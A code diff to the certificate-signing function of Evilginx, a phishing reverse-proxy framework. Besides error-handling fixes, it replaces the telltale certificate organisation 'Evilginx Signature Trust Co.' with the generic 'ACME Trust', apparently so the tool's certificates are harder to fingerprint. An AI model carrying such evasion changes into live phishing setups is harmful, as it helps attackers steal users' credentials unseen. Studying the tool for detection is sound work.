@@ -419,10 +419,10 @@ func (d *CertDb) SignCertificateForHost(host string, phish_host string, port int
 	}
 
 	if x509ca, err = x509.ParseCertificate(d.CACert.Certificate[0]); err != nil {
-		return
+		return nil, err
 	}
 
-	if phish_host == "" {
+	if phish_host == "" || host == phish_host {
 		serialNumberLimit := new(big.Int).Lsh(big.NewInt(1), 128)
 		serialNumber, err := rand.Int(rand.Reader, serialNumberLimit)
 		if err != nil {
@@ -432,7 +432,7 @@ func (d *CertDb) SignCertificateForHost(host string, phish_host string, port int
 		template = x509.Certificate{
 			SerialNumber:          serialNumber,
 			Issuer:                x509ca.Subject,
-			Subject:               pkix.Name{Organization: []string{"Evilginx Signature Trust Co."}},
+			Subject:               pkix.Name{Organization: []string{"ACME Trust"}},
 			NotBefore:             time.Now(),
 			NotAfter:              time.Now().Add(time.Hour * 24 * 180),
 			KeyUsage:              x509.KeyUsageKeyEncipherment | x509.KeyUsageDigitalSignature,
@@ -470,12 +470,12 @@ func (d *CertDb) SignCertificateForHost(host string, phish_host string, port int
 
 	var pkey *rsa.PrivateKey
 	if pkey, err = rsa.GenerateKey(rand.Reader, 1024); err != nil {
-		return
+		return nil, err
 	}
-
+	
 	var derBytes []byte
 	if derBytes, err = x509.CreateCertificate(rand.Reader, &template, x509ca, &pkey.PublicKey, d.CACert.PrivateKey); err != nil {
-		return
+		return nil, err
 	}
 
 	cert = &tls.Certificate{
